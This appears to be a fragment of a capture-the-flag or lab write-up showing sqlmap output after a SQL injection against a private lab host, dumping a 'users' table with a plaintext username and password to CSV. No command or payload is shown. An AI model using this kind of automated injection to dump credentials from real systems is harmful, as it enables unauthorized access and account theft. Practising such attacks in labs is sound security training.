[14:05:05] [INFO] fetching entries for table 'users' in database 'users'
[14:05:06] [INFO] retrieved: 'secretpass'
[14:05:06] [INFO] retrieved: 'pingudad'
Database: users
Table: users
[1 entry]
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+

[14:05:06] [INFO] table 'users.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.74.254/dump/users/users.csv'                                                                 
[14:05:06] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.74.254'                                                                                     

[*] ending @ 14:05:06 /2023-03-18/

```